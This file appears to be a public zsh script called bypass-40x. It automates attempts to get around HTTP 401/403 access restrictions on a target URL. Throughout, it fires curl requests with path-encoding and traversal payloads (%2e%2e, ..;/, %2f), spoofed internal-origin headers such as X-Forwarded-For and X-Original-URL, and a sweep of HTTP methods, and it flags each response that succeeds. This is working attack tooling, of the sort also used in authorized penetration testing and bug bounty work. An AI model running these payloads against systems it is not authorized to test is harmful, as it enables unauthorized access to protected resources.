#! /bin/zsh
figlet Bypass-40x
echo "                               https://github.com/cyal1/bypass-40x"
#Show usage
if [ "$#" -lt 1 ]
then
	echo "./bypass-40x.sh  [OPTIONS]  https://example.com /dir"
	echo "./bypass-40x.sh  [OPTIONS]  https://example.com/dir1/dir2 /dir3/dir4"
	echo "OPTIONS:"
	echo "	-r Allow redirection if response is 3XX"
	exit
fi

METHOD="-XGET" # default is GET
TIMEOUT="" # TIMEOUT="-m 2"
USER_AGENT="-AMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"

#Check optional arguments
REDIRECT=""
if [[ $(echo $*) == *"-r "* ]]
then
		REDIRECT="-L"
fi

# ./bypass-40x.sh https://example.com/xxx
if [ "$#" -eq 1 ]; then
	URL=$1
	ONLY_URL=1
else
	ONLY_URL=0
fi

# ./bypass-40x.sh https://example.com/xxx/ /dir
if [ "$#" -eq 2 ]; then
	URL=$1
	DIR=$2
fi

# ./bypass-40x.sh  [OPTIONS]  https://example.com/xxx/ /dir
if [ "$#" -eq 3 ]; then
	URL=$2
	DIR=$3
fi

#Check URL starts with http*
echo ${URL} | grep -i ^http > /dev/null
if [ $? -gt 0 ]; then
	echo "Note: Start your url with http:// or https://"
	exit
fi

# strip "/" from the suffix of  URL
if [ $ONLY_URL -ne 1 ]; then URL=${URL%/} fi

# strip "/" from the prefix of DIR
DIR=${DIR#/}

function curl_wapper(){
	curl -k -s -o /dev/null -w "%{http_code}","%{size_download}" $TIMEOUT $USER_AGENT $REDIRECT $METHOD $@
}

function payload_Suffux(){
	# $1: full url with out "/" suffux
	output "${1}*" $(curl_wapper "${1}*")
	output "${1};" $(curl_wapper "${1};")
	output "${1}%3f" $(curl_wapper "${1}%3f")
	output "${1}%20" $(curl_wapper "${1}%20")
	output "${1}%F3%A0%81%A9" $(curl_wapper "${1}%F3%A0%81%A9")
	output "${1};/" $(curl_wapper "${1};/")
	output "${1}%2f" $(curl_wapper "${1}%2f")
	output "${1}.json" $(curl_wapper "${1}.json")
	output "${1}%23" $(curl_wapper "${1}%23")
	output "${1}..;/" $(curl_wapper "${1}..;/")
	output "${1}?" $(curl_wapper "${1}?")
	output "${1}??" $(curl_wapper "${1}??")

	output "${1}/*" $(curl_wapper "${1}/*")
	output "${1}/;" $(curl_wapper "${1}/;")
	output "${1}/%3f" $(curl_wapper "${1}/%3f")
	output "${1}/??" $(curl_wapper "${1}/??")
	output "${1}/%20" $(curl_wapper "${1}/%20")
	output "${1}/%F3%A0%81%A9" $(curl_wapper "${1}/%F3%A0%81%A9")
	output "${1}/;/" $(curl_wapper "${1}/;/")
	output "${1}/%2f" $(curl_wapper "${1}/%2f")
	output "${1}/.json" $(curl_wapper "${1}/.json")
	output "${1}/%23" $(curl_wapper "${1}/%23")
	output "${1}/..;/" $(curl_wapper "${1}/..;/")

	output "${1}/%09" $(curl_wapper "${1}/%09")
	output "${1}/.%2f" $(curl_wapper "${1}/.%2f")
	output "${1}/%2e" $(curl_wapper "${1}/%2e")
	output "${1}/%2e/" $(curl_wapper "${1}/%2e/")
	output "${1}//" $(curl_wapper "${1}//")
	output "${1}/./" $(curl_wapper "${1}/./")
	output "${1}/../" $(curl_wapper "${1}/../")
	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/")
	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f")

	output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../")
	output "${1}/randomstr/..;/" $(curl_wapper "${1}/randomstr/..;/")
	output "${1}/randomstr/%2e%2e/" $(curl_wapper "${1}/randomstr/%2e%2e/")
	output "${1}/randomstr/%2e%2e%2f" $(curl_wapper "${1}/randomstr/%2e%2e%2f")
}

function payload_Between(){
	# $1 URL
	# $2 DIR
	output "${1};/${2}" $(curl_wapper "${1};/${2}")
	output "${1}/%2e/${2}" $(curl_wapper "${1}/%2e/${2}")
	output "${1}/;${2}" $(curl_wapper "${1}/;${2}")
	output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
	output "${1}/randomstr/..%2f${2}" $(curl_wapper "${1}/randomstr/..%2f${2}")
	output "${1}/randomstr/..;/${2}" $(curl_wapper "${1}/randomstr/..;/${2}")
	output "${1}/randomstr/%2e%2e/${2}" $(curl_wapper "${1}/randomstr/%2e%2e/${2}")
	output "${1}/randomstr/%2e%2e%2f${2}" $(curl_wapper "${1}/randomstr/%2e%2e%2f${2}")
	output "${1}/;/${2}" $(curl_wapper "${1}/;/${2}")
	output "${1}/./${2}" $(curl_wapper "${1}/./${2}")
	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}")
	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}")
	output "${1}//${2}" $(curl_wapper "${1}//${2}")
}

function payload_Header(){
	FULL_URL=$1
	fqdn_url=${${FULL_URL%%//*}}//$(echo ${FULL_URL}|cut -d'/' -f 3)/
	rewrite_url=${${FULL_URL#*//}#*/}
	# https://www.baidu.com/a/b/c/d
	# $1(FULL_URL): https://www.baidu.com/a/b/c/d
	# fqdn_url: https://www.baidu.com/
	# rewrite_url: a/b/c/d
	output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL)
	output "X-Forward-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forward-For: http://127.0.0.1" $FULL_URL)
	output "X-Forwarded-For: 127.0.0.1:80 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1:80" $FULL_URL)
	output "X-Original-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Original-URL: /$rewrite_url" "$fqdn_url")
	output "X-Rewrite-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Rewrite-URL: /$rewrite_url" $fqdn_url)
	output "X-Forwarded-For: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1" $FULL_URL)
	output "X-Originating-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Originating-IP: 127.0.0.1" $FULL_URL)
	output "X-Remote-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-IP: 127.0.0.1" $FULL_URL)
	output "X-Remote-Addr: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-Addr: 127.0.0.1" $FULL_URL)
	output "X-Client-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Client-IP: 127.0.0.1" $FULL_URL)
	output "X-Forwarded-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-Host: 127.0.0.1" $FULL_URL)
	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL)
	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL)
	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL)

}

RED="\e[1m\e[31m"
GREEN="\e[1m\e[32m"
YELLOW="\e[1m\e[33m"
CLEAR="\e[0m"

function output(){
	# $1 output url
	# $2 status & content-length
	STATUS=$(echo $2|cut -d',' -f 1)
	LENGTH=$(echo $2|cut -d',' -f 2)
    if [[ ${STATUS} =~ 2.. ]]; then
    	echo -e "${GREEN}${2}${CLEAR} \t=> $1"
    elif [[ ${STATUS} =~ 3.. ]]; then
    	echo -e "${YELLOW}${2}${CLEAR} \t=> $1"
    else
    echo -e "${RED}${2}${CLEAR} \t=> $1"
    fi
}

function HTTPMethod(){
	# $1 method
	# $2 status and comtent-length (200,1234)
	# $3 payload with url
	echo -n "$1 request:\t"
	STATUS=$(echo $2|cut -d',' -f 1)
	LENGTH=$(echo $2|cut -d',' -f 2)
    if [[ ${STATUS} =~ 2.. ]]; then
    	if [[ $1 == "POST" ]]; then
    		CURL="curl $REDIRECT -ki -H \"Content-Length: 0\" -X $1 $3"
    	elif [[  $1 == "HEAD"  ]]; then
    		CURL="curl $REDIRECT -ki  -m 1 -X $1 $3"
    	else
    		CURL="curl $REDIRECT -ki -X $1 $3"
    	fi
    	echo -e "${GREEN}${2} \t\t=> ${CURL}${CLEAR}"
    elif [[ ${STATUS} =~ 3.. ]]
    then 
    	echo -e "${YELLOW}${2}${CLEAR}"
    else
    echo -e "${RED}${2}${CLEAR}"
    fi
}

######################## HTTP Methods ######################## 
echo -e "\n${GREEN}[+] HTTP Methods...${CLEAR}"
#DELETE disabled by default, too dangerous
# echo -n "DELETE request: "
FULL_URL="${URL}/${DIR}"

if [ $ONLY_URL -eq 1 ]; then FULL_URL="${URL}" fi

for Verb in {"GET","HEAD","POST","PUT","TRACE","TRACK","PATCH","LS","MOVE","CONNECT","OPTIONS"}
do
	if [[ $Verb == "POST" ]]; then
		STATUS=$(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL)
	elif [[  $Verb == "HEAD"  ]]; then
		STATUS=$(curl_wapper -m 1 -X HEAD $FULL_URL) # timeout=1
	else
		STATUS=$(curl_wapper -X $Verb $FULL_URL)
	fi
	HTTPMethod $Verb $STATUS $FULL_URL
done

####################### Bugbountytips ##########################
echo -e "\n${GREEN}[+] Bugbountytips 40x bypass methods...${CLEAR}"
FULL_URL="${URL}/${DIR%/}"
if [ $ONLY_URL -eq 1 ]; then FULL_URL="${URL%/}" fi
payload_Suffux $FULL_URL

if [ $ONLY_URL -ne 1 ]; then
	payload_Between ${URL} ${DIR}
fi

########################## HEADERS #############################
echo -e "\n${GREEN}[+] HEADERS...${CLEAR}"
FULL_URL="${URL}/${DIR}"
if [ $ONLY_URL -eq 1 ]; then FULL_URL="${URL}" fi
payload_Header $FULL_URL


